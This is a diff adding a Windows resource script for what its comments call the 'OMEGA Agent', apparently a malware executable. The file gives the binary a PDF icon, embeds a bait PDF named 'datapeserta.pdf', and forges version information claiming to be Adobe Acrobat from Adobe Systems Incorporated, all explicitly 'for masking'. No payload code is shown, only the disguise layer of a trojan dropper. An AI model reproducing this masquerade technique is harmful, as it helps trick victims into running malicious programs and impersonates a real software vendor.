@@ -1,0 +1,41 @@
+// resources.rc
+// Windows Resource Description for OMEGA Agent
+
+// 1. Defining the Main Icon of the Executable
+// This will make it look like a standard PDF file in Windows Explorer
+MAINICON ICON "..\\icon\\pdf.ico"
+
+// 2. Embedding the PDF bait file
+// IDR_PDF_DATA is a custom identifier for the binary data
+IDR_PDF_DATA RCDATA "..\\file\\datapeserta.pdf"
+
+// 3. Version Information for Masking
+// This makes the file properties look like Adobe Acrobat
+1 VERSIONINFO
+ FILEVERSION 1,0,0,1
+ PRODUCTVERSION 1,0,0,1
+ FILEFLAGSMASK 0x3fL
+ FILEFLAGS 0x0L
+ FILEOS 0x40004L
+ FILETYPE 0x1L
+ FILESUBTYPE 0x0L
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904b0"
+        BEGIN
+            VALUE "CompanyName", "Adobe Systems Incorporated"
+            VALUE "FileDescription", "Adobe Acrobat Document"
+            VALUE "FileVersion", "1.0.0.1"
+            VALUE "InternalName", "Acrobat"
+            VALUE "LegalCopyright", "Copyright (C) 2026 Adobe Systems Incorporated"
+            VALUE "OriginalFilename", "datapeserta.pdf"
+            VALUE "ProductName", "Adobe Acrobat"
+            VALUE "ProductVersion", "1.0.0.1"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x409, 1200
+    END
+END
